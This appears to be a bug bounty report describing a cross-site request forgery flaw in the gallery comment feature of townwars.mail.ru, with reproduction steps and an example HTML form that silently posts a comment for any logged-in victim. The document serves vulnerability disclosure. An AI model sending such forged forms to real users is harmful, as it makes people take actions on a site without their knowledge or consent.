Summary:
CSRF in photo gallery comments on out-of-scope project
Hello,

I've Found __CSRF__ in ``` townwars.mail.ru/Gallery/addComment/ ```

while any user can add image to ``` townwars.mail.ru/Gallery/ ```
after that any user can add comment to this image and here there is no any protection 

_steps to reproduce_
- Go to ```   townwars.mail.ru/Gallery/ ```
- choose any photo 
- you can add a comment on a photo you choosed  
- now send this form to any user and he will put a comment 

 __example form__
``` <html>
  <body>
    <form action="https://townwars.mail.ru/Gallery/addComment/?&pid=39277&gid=515" method="POST">
      <input type="hidden" name="body" value="test" />
      <input type="hidden" name="x" value="68" />
      <input type="hidden" name="y" value="13" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
 ```

if you send this form to any login user he will put a comment on the photo in URL
